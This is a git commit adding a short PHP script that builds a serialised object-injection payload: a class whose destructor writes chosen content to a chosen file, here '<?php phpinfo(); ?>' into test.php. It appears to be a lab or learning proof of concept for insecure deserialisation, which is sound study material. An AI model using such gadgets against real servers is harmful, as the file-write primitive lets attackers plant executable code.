ac47ab75c675a75b2622d9b1a90501be27b6133a
kymb0 <55473161+kymb0@users.noreply.github.com>
2021-06-10 09:19:01 +0930

    Create serialize.php

---
+++ serialize/serialize.php
@@ -0,0 +1,13 @@
+<?php
+class Foo{
+    function __construct($filename, $data) {
+        $this->filename = $filename;
+        $this->data = $data;
+    }
+    function __destruct(){
+        file_put_contents($this->filename, $this->data);
+    }
+}
+$a = new Foo("test.php","<?php phpinfo(); ?>");
+echo serialize($a);
+?>
